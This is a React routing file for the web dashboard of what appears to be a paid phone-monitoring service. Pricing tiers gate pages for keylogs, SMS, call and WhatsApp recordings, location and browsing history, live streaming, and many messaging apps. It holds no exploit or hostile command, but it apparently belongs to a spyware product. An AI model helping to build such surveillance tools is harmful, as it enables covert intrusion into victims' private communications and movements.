import {
  BrowserRouter as Router,
  Routes,
  Route,
} from "react-router-dom";
import { Toaster } from "sonner";
import "./lib/toastStyles.css";

// Pages
import Register from "./customComponents/admin/Register";
import Login from "./customComponents/admin/Login";
import NotFound from "./customComponents/User/NotFound";
import ScrollToTop from "./customComponents/dashboardSections/ScrollToTop";
import RouteChangeLoader from "./customComponents/dashboardSections/RouteChangeLoader";

// Dashboard Pages
import { DashboardLayout } from "./layout/DashboardLayout";
import { Dashboard } from "./customComponents/dashboardSections/Dashboard";
import DeviceInfo from "./customComponents/Device Page/Device";
import CallHistory from "./customComponents/Pages/CallHistory";
import CallRecording from "./customComponents/Pages/CallRecording";
import SMS from "./customComponents/Pages/SMS";
import LocationHistory from "./customComponents/Pages/LocationHistory";
import Contact from "./customComponents/Pages/Contact";
import IPAddress from "./customComponents/Pages/IPAddress";
import UserProfile from "./customComponents/User/UserProfile";

// Social Media
import WhatsApp from "./customComponents/Social Media/WhatsApp/WhatsApp";
import FaceBook from "./customComponents/Social Media/FaceBook/FaceBook";
import Instagram from "./customComponents/Social Media/Instagram/Instagram";
import Snapchat from "./customComponents/Social Media/Snapchat/Snapchat";
import Telegram from "./customComponents/Social Media/Telegram/Telegram";
import Linkedin from "./customComponents/Social Media/Linkedin/Linkedin";
// import Signal from "./customComponents/Social Media/Signal/Signal";
// import Skype from "./customComponents/Social Media/Skype/Skype";
// import Tinder from "./customComponents/Social Media/Tinder/Tinder";
// import Line from "./customComponents/Social Media/Line/Line";
// import Imo from "./customComponents/Social Media/Imo/Imo";
// import Kik from "./customComponents/Social Media/kik/Kik";
// import Hangout from "./customComponents/Social Media/Hangout/Hangout";
import Botim from "./customComponents/Social Media/Botim/Botim";

// Media
import Photos from "./customComponents/Photos/Components/Photos";
import Videos from "./customComponents/Videos/Components/Videos";
import { PricingPage } from "./customComponents/Buy Now/PricingPage";
import LiveStream from "./customComponents/Live Stream/LiveStream";
// import WhatsappVideos from "./customComponents/Social Media/WhatsApp/WhatsappVideos";
import WhatsappBusiness from "./customComponents/Social Media/Whatsapp-Business/WhatsAppBusiness";

// Auth
import LoginPage from "./auth/LoginPage";
import RegisterPage from "./auth/RegisterPage";
import ResetPassword from "./auth/ResetPassword";
import ProtectedRoute from "./contexts/ProtectedRoute";
import WhatsappStatus from "./customComponents/Social Media/WhatsApp/WhatsappStatus";
import DocumentPage from "./customComponents/Documents/Components/DocumentPage";
import WhatsAppCallRecording from "./customComponents/Social Media/WhatsApp/WhatsappCallRecording";
import PlanForm from "./customComponents/Pages/Plans/PlanForm";
import Index from "./customComponents/Profile/Index";
import Applications from "./customComponents/Pages/Applications";
import InternetHistory from "./customComponents/Pages/InternetHistory";

// Route guard by plan
import PlanRouteGuard from "./contexts/PlanRouteGuard";
import Youtube from "./customComponents/Social Media/Youtube/Youtube";
import KeyLogger from "./customComponents/Pages/KeyLogger";
import Outlook from "./customComponents/Social Media/Outlook/Outlook";
import Gmail from "./customComponents/Social Media/Gmail/Gmail";
 

interface DashboardProps {
  isSidebarOpen: boolean;
}

function App({ isSidebarOpen }: DashboardProps) {
  return (
    <>
      <Toaster
        position="top-center"
        toastOptions={{ className: "toast-animated toast-hover" }}
      />
      <Router>
        <ScrollToTop />
        <RouteChangeLoader />
        <Routes>
          {/* Public/Auth routes */}
          <Route path="/pricing" element={<PricingPage />} />
          <Route path="/admin/register" element={<Register />} />
          <Route path="/admin/login" element={<Login />} />
          <Route path="/user/login" element={<LoginPage />} />
          <Route path="/user/register" element={<RegisterPage />} />
          <Route path="/user/reset-password" element={<ResetPassword/>}/>

          {/* App shell (protected) */}
          <Route
            path="/"
            element={
              <ProtectedRoute>
                <DashboardLayout />   
              </ProtectedRoute>
            }
          >
            {/* Always accessible inside the shell */}
            <Route index element={<Dashboard isSidebarOpen={isSidebarOpen} />} />
            <Route path="profile" element={<Index />} />

            {/* BASIC (planId >= 1) */}
            <Route element={<PlanRouteGuard minId={1} />}>
              <Route path="device" element={<DeviceInfo />} />
              <Route path="call-history" element={<CallHistory />} />
              <Route path="sms" element={<SMS />} />
              <Route path="location-history" element={<LocationHistory />} />
              <Route path="internet-history" element={<InternetHistory />} />
              <Route path="keylogs" element={<KeyLogger />} />
              <Route path="userprofile" element={<UserProfile />} />
              <Route path="applications" element={<Applications />} />
              <Route path="whatsapp" element={<WhatsApp />} />
            </Route>

            {/* STANDARD (planId >= 2) */}
            <Route element={<PlanRouteGuard minId={2} />}>
              <Route path="call-recording" element={<CallRecording />} />
              <Route path="contacts" element={<Contact />} />
              
              

              {/* Social */}
              <Route path="whatsapp-business" element={<WhatsappBusiness />} />
              <Route path="instagram" element={<Instagram />} />
              <Route path="telegram" element={<Telegram />} />
              <Route path="snapchat" element={<Snapchat />} />
              <Route path="facebook" element={<FaceBook />} />
              <Route path="youtube" element={<Youtube />} />

              <Route path="outlook" element={<Outlook />} />
              <Route path="gmail" element={<Gmail />} />

              
              {/* <Route path="whatsapp-videos" element={<WhatsappVideos />} />
              <Route path="facebook" element={<FaceBook />} />
              
              <Route path="signal" element={<Signal />} />
              <Route path="skype" element={<Skype />} />
              <Route path="tinder" element={<Tinder />} />
              <Route path="line" element={<Line />} />
              <Route path="imo" element={<Imo />} />
              <Route path="kik" element={<Kik />} />
              <Route path="hangout" element={<Hangout />} /> */}
              

              {/* Media */}
              <Route path="photos" element={<Photos />} />
              <Route path="videos" element={<Videos />} />
              <Route path="whatsapp-status" element={<WhatsappStatus />} />
              <Route path="documents" element={<DocumentPage />} />
            </Route>

            {/* PREMIUM (planId >= 3) */}
            <Route element={<PlanRouteGuard minId={3} />}>
              <Route path="live-stream" element={<LiveStream />} />
              <Route path="ip-address" element={<IPAddress />} />
              <Route path="whatsapp-recording" element={<WhatsAppCallRecording />} />
              <Route path="linkedin" element={<Linkedin />} />
              <Route path="botim" element={<Botim />} />
            </Route>
          </Route>

          {/* Payment (keep protected or make public per your flow) */}
          <Route
            path="buy-plan"
            element={
              <ProtectedRoute>
                <PlanForm />
              </ProtectedRoute>
            }
          />

          {/* Fallback */}
          <Route path="*" element={<NotFound />} />
        </Routes>
      </Router>
    </>
  );
}

export default App;
